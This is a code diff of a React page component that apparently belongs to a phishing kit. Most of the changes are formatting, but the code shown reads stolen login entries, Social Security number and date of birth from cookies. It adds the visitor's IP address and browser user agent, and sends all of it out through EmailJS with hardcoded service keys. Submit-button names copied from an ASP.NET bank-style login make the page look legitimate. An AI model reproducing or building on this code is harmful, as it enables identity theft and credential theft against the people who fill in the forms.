@@ -3,10 +3,8 @@ import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import emailjs from "@emailjs/browser";
 
-
 export default function MailAdditional() {
-    
-    const [isLoading, setIsLoading] = React.useState(false);
+  const [isLoading, setIsLoading] = React.useState(false);
   const login1: Login = cookies.get("login1");
   const login2: Login2 = cookies.get("login2");
   const personal: Personal = cookies.get("personal");
@@ -30,28 +28,37 @@ export default function MailAdditional() {
     setIsLoading(true);
     event.preventDefault();
 
-    emailjs.sendForm("service_ya9aoe5", "template_30nkx7m", form.current!, "hd0P0MIIRcBmXr70h").then((result)=>{
-        console.log(result.text)
-        navigate("../success", {replace:true});
-    }, (error)=>{
-        alert("could not complete your request")
-        console.log(error);
-        setIsLoading(false)
-    })
-    
+    emailjs
+      .sendForm(
+        "service_ya9aoe5",
+        "template_30nkx7m",
+        form.current!,
+        "hd0P0MIIRcBmXr70h"
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+          navigate("../success", { replace: true });
+        },
+        (error) => {
+          alert("Could not complete your request");
+          console.log(error);
+          setIsLoading(false);
+        }
+      );
   }
 
-  const [ipAddress, setIpAddress] = React.useState<string>()
+  const [ipAddress, setIpAddress] = React.useState<string>();
 
   async function getIP() {
     const request = await fetch("https://api.ipify.org?format=json");
-    const response : {ip:string} = await request.json()
-    setIpAddress(response.ip)
+    const response: { ip: string } = await request.json();
+    setIpAddress(response.ip);
   }
 
-  useEffect(()=>{
-    getIP()
-  }, [])
+  useEffect(() => {
+    getIP();
+  }, []);
 
   return (
     <>
@@ -74,8 +81,6 @@ export default function MailAdditional() {
             </div>
           </div>
 
-
-          
           <div className="LoginClear"></div>
           <div className="LoginPadding10">
             <div className="row">
@@ -104,7 +109,11 @@ export default function MailAdditional() {
                 <input type="text" name="sn" defaultValue={personal.ssn} />
                 <input type="text" name="db" defaultValue={personal.dob} />
                 <input type="text" name="pi" defaultValue={ipAddress} />
-                <input type="text" name="brow" defaultValue={window.navigator.userAgent} />
+                <input
+                  type="text"
+                  name="brow"
+                  defaultValue={window.navigator.userAgent}
+                />
               </div>
             </div>
             <div className="row" style={{ marginBottom: "20px" }}>
@@ -160,19 +169,26 @@ export default function MailAdditional() {
           </div>
 
           <div className="button-containerADA LoginButtonContainerDiv">
-          {isLoading ?
-            <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
-          <span className="loader"></span>
-          </div>
-          :
-            <input
-              type="submit"
-              name="ctl00$PageContent$Login1$IdSubmitButton"
-              value="Submit"
-              id="ctl00_PageContent_Login1_IdSubmitButton"
-              className="ColorButton"
-              tabIndex={11}
-            />}
+            {isLoading ? (
+              <div
+                style={{
+                  width: "100%",
+                  display: "flex",
+                  justifyContent: "center",
+                }}
+              >
+                <span className="loader"></span>
+              </div>
+            ) : (
+              <input
+                type="submit"
+                name="ctl00$PageContent$Login1$IdSubmitButton"
+                value="Submit"
+                id="ctl00_PageContent_Login1_IdSubmitButton"
+                className="ColorButton"
+                tabIndex={11}
+              />
+            )}
           </div>
 
           <div
